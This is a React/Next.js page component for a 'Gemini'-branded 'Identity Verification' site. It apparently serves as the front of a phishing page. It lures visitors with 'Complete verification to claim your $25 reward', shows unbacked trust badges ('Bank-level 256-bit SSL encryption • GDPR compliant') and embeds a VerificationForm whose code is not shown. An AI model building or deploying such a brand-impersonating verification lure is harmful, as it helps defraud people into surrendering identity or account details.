import Head from 'next/head'
import VerificationForm from '@/Components/VerificationForm'

export default function Home() {
  return (
    <>
      <Head>
        <title>Gemini Verification</title>
        <meta name="description" content="Complete your Gemini identity verification" />
      </Head>
      
      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 py-12 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center bg-white p-4 rounded-full shadow-lg mb-4">
              <span className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">
                Gemini
              </span>
            </div>
            <h1 className="text-3xl font-bold text-gray-900">Identity Verification</h1>
            <p className="text-gray-500 mt-2">Complete verification to claim your $25 reward</p>
          </div>
          
          <VerificationForm />
          
          <div className="mt-12 text-center text-sm text-gray-500">
            <div className="flex justify-center space-x-6 mb-4">
              {['🔒', '🛡️', '🔑'].map((icon, i) => (
                <div key={i} className="bg-white p-3 rounded-full shadow-sm">
                  <span className="text-xl">{icon}</span>
                </div>
              ))}
            </div>
            <p>Bank-level 256-bit SSL encryption • GDPR compliant</p>
          </div>
        </div>
      </div>
    </>
  )
}